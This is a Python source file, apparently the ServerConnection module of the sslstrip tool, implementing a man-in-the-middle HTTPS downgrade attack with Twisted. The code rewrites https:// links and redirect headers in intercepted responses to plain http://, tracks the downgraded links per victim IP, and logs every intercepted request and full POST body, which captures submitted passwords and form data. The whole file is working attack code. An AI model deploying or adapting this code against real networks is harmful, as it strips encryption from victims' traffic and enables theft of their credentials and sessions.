# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging, re, string, random, zlib, gzip
from io import BytesIO

from twisted.web.http import HTTPClient
from .URLMonitor import URLMonitor

class ServerConnection(HTTPClient):

    ''' The server connection is where we do the bulk of the stripping.  Everything that
    comes back is examined.  The headers we dont like are removed, and the links are stripped
    from HTTPS to HTTP.
    '''

    urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
    urlType           = re.compile(r"https://", re.IGNORECASE)
    urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.urlMonitor       = URLMonitor.getInstance()
        self.isAssetRequest   = False
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False

    def getLogLevel(self):
        return logging.DEBUG

    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        logging.warning("[HTTP] Request: %s %s"  % (self.command.decode('utf-8'), self.uri))
        self.sendCommand(self.command, self.uri.encode('utf-8'))

    def sendHeaders(self):
        for header, value in self.headers.items():
            logging.log(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
            self.sendHeader(header.encode('utf-8'), value.encode('utf-8'))

        self.endHeaders()

    def sendPostData(self):
        logging.warning("[HTTP] Post Data (" + self.headers['host'] + "): " + str(self.postData.decode('utf-8')))
        self.transport.write(self.postData)

    def connectionMade(self):
        logging.log(self.getLogLevel(), "HTTP connection made.")
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command.decode('utf-8') == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, code, message):
        logging.log(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
        self.client.setResponseCode(int(code), message)

    def handleHeader(self, key, value):
        key = key.decode('utf-8')

        logging.log(self.getLogLevel(), "Got server header: %s:%s" % (key, value))

        if (key.lower() == 'location'):
            value = self.replaceSecureLinks(value.decode('utf-8'))

        if (key.lower() == 'content-type'):
            type = value.decode('utf-8')
            if (type.find('image') != -1 or type.find('font') != -1):
                self.isAssetRequest = True
                logging.debug("Response is binary asset, not scanning...")

        if (key.lower() == 'content-encoding'):
            if (value.decode('utf-8').find('gzip') != -1):
                logging.debug("Response is compressed...")
                self.isCompressed = True
        elif (key.lower() == 'content-length'):
            self.contentLength = value
        elif (key.lower() == 'set-cookie'):
            self.client.responseHeaders.addRawHeader(key.encode('utf-8'), value)
        else:
            self.client.setHeader(key.encode('utf-8'), value)

    def handleEndHeaders(self):
       if (self.isAssetRequest and self.contentLength != None):
           self.client.setHeader("Content-Length", self.contentLength)

       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):
        if (self.isAssetRequest):
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)

    def handleResponseEnd(self):
        if (self.isAssetRequest):
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)

    def handleResponse(self, data):
        if (self.isCompressed):
            logging.debug("Decompressing content...")
            data = gzip.GzipFile('', 'rb', 9, BytesIO(data)).read()
        
        logging.log(self.getLogLevel(), "Read from server:")
        logging.log(self.getLogLevel(), data)

        data = data
        try:
            data = self.replaceSecureLinks(data.decode('utf-8')).encode('utf-8')
        except:
            # Ignore decoding errors
            pass

        if (self.contentLength != None):
            self.client.setHeader('Content-Length', str(len(data)))
        
        try:
            self.client.write(data)
            self.shutdown()
        except:
            # Ignore already finished requests
            pass

    def replaceSecureLinks(self, data):
        iterator = re.finditer(ServerConnection.urlExpression, data)

        for match in iterator:
            url = match.group()

            logging.debug("Found secure reference: " + url)

            url = url.replace('https://', 'http://', 1)
            url = url.replace('&amp;', '&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)

        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
        return re.sub(ServerConnection.urlType, 'http://', data)

    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            self.client.finish()
            self.transport.loseConnection()


